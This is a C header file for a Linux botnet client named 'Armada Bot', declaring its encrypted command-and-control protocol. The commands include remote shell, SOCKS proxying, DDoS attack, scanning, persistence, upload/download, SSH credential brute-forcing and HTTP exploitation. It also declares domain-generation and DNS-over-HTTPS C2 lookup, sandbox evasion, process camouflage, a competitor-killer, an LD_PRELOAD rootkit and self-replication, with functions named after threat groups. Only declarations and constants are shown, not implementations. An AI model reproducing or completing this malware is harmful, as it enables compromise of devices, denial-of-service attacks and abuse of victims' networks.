#ifndef BOT_H
#define BOT_H
/*
 * Armada Bot — Pure C (GCC 4.1.2 / uClibc)
 * Encrypted TCP via ChaCha20 stream cipher. Zero external deps.
 */

/* Safety defines for minimal uClibc toolchains */
#ifndef NULL
#define NULL ((void*)0)
#endif
#ifndef __SIZE_TYPE__
#define __SIZE_TYPE__ unsigned long
#endif
typedef __SIZE_TYPE__ size_t;

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <time.h>
#include <errno.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <dirent.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/utsname.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <poll.h>
#include <sys/ioctl.h>

#ifdef __linux__
#include <sys/sysinfo.h>
#endif

/* Safe memory zeroing — survives compiler optimization */
#ifndef HAVE_EXPLICIT_BZERO
static void volatile_memzero(void *ptr, size_t len) {
    volatile uint8_t *p = (volatile uint8_t *)ptr;
    while (len--) *p++ = 0;
}
#define explicit_bzero volatile_memzero
#endif

/* ======================================================================
   DYNAMIC STRING (replaces std::string)
   ====================================================================== */

typedef struct {
    char*  buf;
    size_t len;
    size_t cap;
} dstr;

void   ds_init(dstr* s);
void   ds_free(dstr* s);
void   ds_set(dstr* s, const char* str);
void   ds_setn(dstr* s, const char* str, size_t n);
void   ds_cat(dstr* s, const char* str);
void   ds_catn(dstr* s, const char* str, size_t n);
void   ds_catc(dstr* s, char c);
void   ds_catds(dstr* s, const dstr* other);
void   ds_clear(dstr* s);
int    ds_empty(const dstr* s);
int    ds_eq(const dstr* s, const char* str);
int    ds_eqds(const dstr* s, const dstr* other);
size_t ds_find(const dstr* s, const char* needle, size_t start);
dstr   ds_sub(const dstr* s, size_t pos, size_t n);
char   ds_back(const dstr* s);
void   ds_pop(dstr* s);
dstr   ds_from(const char* str);

/* inline accessor */
#define ds_cstr(s) ((s)->buf ? (s)->buf : "")
#define ds_len(s)  ((s)->len)

/* ======================================================================
   DYNAMIC BYTE ARRAY (replaces std::vector<uint8_t>)
   ====================================================================== */

typedef struct {
    uint8_t* data;
    size_t   len;
    size_t   cap;
} dbuf;

void   db_init(dbuf* b);
void   db_free(dbuf* b);
void   db_push(dbuf* b, uint8_t byte);
void   db_append(dbuf* b, const uint8_t* data, size_t n);
void   db_setn(dbuf* b, const uint8_t* data, size_t n);
void   db_reserve(dbuf* b, size_t cap);
void   db_clear(dbuf* b);
#define db_ptr(b)  ((b)->data)
#define db_len(b)  ((b)->len)

/* ======================================================================
   STRING ARRAY (replaces std::vector<std::string>)
   ====================================================================== */

typedef struct {
    dstr*  items;
    size_t count;
    size_t cap;
} strarr;

void   sa_init(strarr* a);
void   sa_free(strarr* a);
void   sa_push(strarr* a, const char* s);
void   sa_pushds(strarr* a, const dstr* s);
void   sa_clear(strarr* a);
void   sa_shuffle(strarr* a);
void   sa_insert(strarr* dst, const strarr* src);
#define sa_get(a, i) ds_cstr(&(a)->items[i])
#define sa_count(a)  ((a)->count)

/* ======================================================================
   ENCRYPTED TCP CONNECTION
   ====================================================================== */

typedef struct {
    uint8_t  key[32];
    uint32_t nonce[3];
    uint32_t counter;
    uint8_t  ks[64];
    int      ks_pos;
} cipher_state_t;

typedef struct {
    int            fd;
    int            valid;
    cipher_state_t send_cipher;
    cipher_state_t recv_cipher;
    uint8_t        hmac_key[32]; /* per-session HMAC key for frame authentication */
} conn_t;

/* ======================================================================
   SHA-256 STREAMING CONTEXT
   ====================================================================== */

typedef struct {
    uint32_t state[8];
    uint8_t  buf[64];
    size_t   buf_len;
    uint64_t total;
} sha256_ctx_t;

void sha256_init(sha256_ctx_t* c);
void sha256_update(sha256_ctx_t* c, const uint8_t* data, size_t len);
void sha256_finish(sha256_ctx_t* c, uint8_t out[32]);

/* ======================================================================
   CONSTANTS
   ====================================================================== */

#define CONFIG_SEED         "e5a7cf2d"
#define SYNC_TOKEN          "slQVVAqOrkWEti*X"
#define BUILD_TAG           "v4.6.9"
#define DGA_TLD             ".xyz"
#define DGA_DOMAINS_PER_DAY 20
#define MAX_SESSIONS        100
#define RETRY_FAST_FLOOR_MS 2000
#define RETRY_FAST_CEIL_MS  4000
#define RETRY_RAMP_BASE_MS  5000
#define RETRY_RAMP_MAX_MS   30000
#define PHANTOM_RETRY_MS    120000
#define CTRL_PORT           42780   /* localhost port for single-instance control */


/* Binary command protocol: [0xFF magic][cmd_id:1][args_len:2 BE][args:N] */
#define CMD_MAGIC           0xFF
#define CMD_SHELL           0x01
#define CMD_STREAM          0x02
#define CMD_DETACH          0x03
#define CMD_INFO            0x04
#define CMD_SOCKS           0x05
#define CMD_STOPSOCKS       0x06
#define CMD_SOCKSAUTH       0x07
#define CMD_SCAN            0x08
#define CMD_STOPSCAN        0x09
#define CMD_PERSIST         0x0A
#define CMD_ATTACK          0x0B
#define CMD_STOPATTACK      0x0C
#define CMD_REINSTALL       0x0D
#define CMD_KILL            0x0E
#define CMD_EXIT            0x0F
#define CMD_UPDATEFETCH     0x10
#define CMD_DOWNLOAD        0x1C
#define CMD_UPLOAD          0x1D
#define CMD_SSH             0x20
#define CMD_STOPSSH         0x21
#define CMD_HTTP            0x22
#define CMD_STOPHTTP        0x23
/* CMD_REDIS/PGSQL/MYSQL removed — these scanners are handled by brutus */

/* ======================================================================
   GLOBAL STATE
   ====================================================================== */

extern int g_verbose;

extern dstr g_bot_id, g_arch, g_proc, g_origin;
extern int64_t g_ram;
extern int     g_cpu;
extern double  g_uplink;

extern dstr g_proxy_user, g_proxy_pass;
extern pthread_mutex_t g_socks_creds_mtx;

extern int g_ctrl_fd;                /* single-instance control listener socket */
extern volatile int g_socks_active, g_socks_count, g_socks_stop;
extern dstr g_active_relay;
extern pthread_mutex_t g_socks_mtx;
extern int g_socks_listener_fd;

extern strarr g_service_addrs;
extern strarr g_doh_servers, g_doh_fallback, g_resolver_pool;
extern strarr g_sys_markers, g_proc_filters, g_parent_checks;
extern strarr g_camo_names;
extern strarr g_sb_names, g_kill_patterns;

extern dstr g_speed_test_url, g_dns_json_accept;
extern dstr g_rc_target, g_store_dir, g_script_label, g_bin_label;
extern dstr g_unit_path, g_unit_name, g_unit_body, g_tmpl_body, g_sched_expr;
extern dstr g_env_label, g_cache_loc, g_lock_loc, g_heartbeat_loc;
extern dstr g_proto_challenge, g_proto_success, g_proto_reg_fmt;
extern dstr g_proto_ping, g_proto_pong, g_proto_out_fmt, g_proto_err_fmt;
extern dstr g_proto_stdout_fmt, g_proto_stderr_fmt;
extern dstr g_proto_exit_err_fmt, g_proto_exit_ok, g_proto_info_fmt;
extern dstr g_msg_stream_start, g_msg_bg_start, g_msg_persist_start;
extern dstr g_msg_kill_ack, g_msg_socks_err_fmt, g_msg_socks_start_fmt;
extern dstr g_msg_socks_stop, g_msg_socks_auth_fmt;
extern dstr g_shell_bin, g_shell_flag, g_bash_bin;
extern dstr g_proc_prefix, g_cmdline_suffix;
extern dstr g_pgrep_bin, g_pgrep_flag, g_dev_null_path;
extern dstr g_systemctl_bin, g_crontab_bin;
extern dstr g_fetch_url;
extern dstr g_fetch_url_resolved;
extern dstr g_bins_host_str;
extern const char *g_bins_host_ptr;

/* ======================================================================
   ATOMIC HELPERS
   ====================================================================== */

extern pthread_mutex_t g_atomic_mtx;
int  at_load(volatile int* p);
void at_store(volatile int* p, int v);
int  at_inc(volatile int* p);
int  at_dec(volatile int* p);

/* ======================================================================
   UTILITY
   ====================================================================== */

#ifdef DEBUG
void   debug_log(const char* fmt, ...);
#else
#define debug_log(...) ((void)0)
#endif
void   urandom_bytes(uint8_t* out, size_t len);
uint32_t urandom_u32(void);
char*  int_to_str(int n);         /* returns static buf, NOT thread-safe for concurrent use */
char*  i64_to_str(int64_t n);
void   sleep_ms(int ms);
void   sleep_jitter(int floor_ms, int ceil_ms);
int    jitter_ms(int floor_ms, int ceil_ms);
void   random_string(char* out, int n);

/* ======================================================================
   CRYPTO
   ====================================================================== */

dbuf   hex_decode(const char* hex);
dstr   hex_encode(const uint8_t* data, size_t len);
dstr   base64_encode(const uint8_t* data, size_t len);
dbuf   base64_decode(const char* encoded);
dbuf   sha256_oneshot(const uint8_t* data, size_t len);
dbuf   sha256_str(const char* s);
dbuf   aes256ctr_decrypt(const uint8_t* blob, size_t len);
dbuf   chacha20_crypt(const uint8_t* data, size_t len, const uint8_t* raw_key, size_t klen);
dbuf   aead_decrypt(const uint8_t* blob, size_t len);
dbuf   dual_decrypt(const uint8_t* blob, size_t len);
dbuf   charizard(const char* seed);
dstr   venusaur(const char* encoded);
dstr   hafnium(const char* challenge, const char* secret);

void   chacha20_block(const uint32_t input[16], uint8_t output[64]);
void   cipher_init(cipher_state_t* cs, const uint8_t key[32]);
int    cipher_crypt(cipher_state_t* cs, uint8_t* data, size_t len);
void   hmac_sha256(const uint8_t *key, size_t key_len,
                   const uint8_t *msg, size_t msg_len, uint8_t out[32]);
void   x25519_scalarmult(uint8_t q[32], const uint8_t n[32], const uint8_t p[32]);
void   x25519_scalarmult_base(uint8_t q[32], const uint8_t n[32]);

/* ======================================================================
   CONFIG
   ====================================================================== */

void ensure_boot(void);
void ensure_sandbox(void);
void ensure_network(void);
void ensure_proto(void);
void ensure_persist(void);
void ensure_killer(void);

/* ======================================================================
   OPSEC
   ====================================================================== */

void   stuxnet(int argc, char **argv);
int    winnti(void);
void   mustang_panda(dstr* out);
int    revil_single_instance(void);
void   charming_kitten(dstr* out);
int64_t revil_mem(void);
int    revil_cpu(void);
void   revil_proc(dstr* out);
double revil_uplink_cached(void);
void   killer_start(void);

/* ======================================================================
   CONNECTION
   ====================================================================== */

typedef struct { dstr host; dstr port; } c2ep_t;

int      parse_address(const char* addr, dstr* host, dstr* port);
conn_t*  vpn_connect(const char* host, const char* port);
void     vpn_close(conn_t* c);
dstr     vpn_read_line(conn_t* c, int timeout_sec);
int      vpn_read_byte(conn_t* c, int timeout_sec);
int      vpn_read_exact(conn_t* c, void* buf, size_t n, int timeout_sec);
void     vpn_write(conn_t* c, const char* data, size_t len);
void     vpn_writes(conn_t* c, const char* str);

int      is_valid_hostname(const char* h);
strarr   parse_txt_addresses(const char* data);
strarr   parse_txt_ips(const char* data);
strarr   dns_txt_query(const char* domain, const char* server);
strarr   dns_txt_resolve_ips(const char* domain);
strarr   palkia(const char* domain);
strarr   darkrai(const char* domain);
dstr     rayquaza(const char* domain);
strarr   resolve_one(const char* decoded);
strarr   dialga_one(int idx);
void     kyurem(int index, dstr* domain_out, dstr* port_out);
dstr     necrozma(const char* domain);
void     anonymous_sudan(conn_t* c);
dstr     http_get(const char* url, int timeout_sec);

/* ======================================================================
   COMMANDS
   ====================================================================== */

int  black_energy(conn_t* c, const char* command);
int  dispatch_cmd(conn_t* c, uint8_t cmd_id, const char* args);
dstr sidewinder(const char* cmd);
void ocean_lotus(const char* cmd);
void machete(const char* cmd, conn_t* c);

/* ======================================================================
   PERSISTENCE
   ====================================================================== */

void fin7(void);
void carbanak(const char* hidden_dir);
int  dragonfly(void);  /* returns 1 if systemd available, 0 otherwise */
void nuke_and_exit(void);
void persist_refresh(void);

/* ======================================================================
   SOCKS
   ====================================================================== */

int  turmoil(const char* port, conn_t* c2);
int  relay_backconnect(const char* host, const char* port, conn_t* c2);
void emotet(void);
void trickbot(int client_fd);

/* ======================================================================
   SCANNER
   ====================================================================== */

#ifndef NO_SELFREP
extern volatile int g_scanner_running;
void scanner_init(const char* scan_srv_addr);
void scanner_kill(void);

/* ======================================================================
   SSH CREDENTIAL SCANNER
   ====================================================================== */

extern int ssh_scanner_pid;
extern int ssh_report_fd;   /* read end of pipe — child writes hits here */
void ssh_scanner_init(const char *b64_payload, conn_t *parent_conn);
void ssh_scanner_kill(void);

/* HTTP EXPLOIT MODULE */
extern int http_exploit_pid;
extern int http_report_fd;
void http_exploit_init(const char *b64_payload);
void http_exploit_kill(void);



/* ROOTKIT (LD_PRELOAD) */
void rootkit_install(const char *b64_so);
void rootkit_remove(void);
void rootkit_auto(void);  /* auto-activate if .so already on disk */


#endif /* NO_SELFREP */

#endif /* BOT_H */
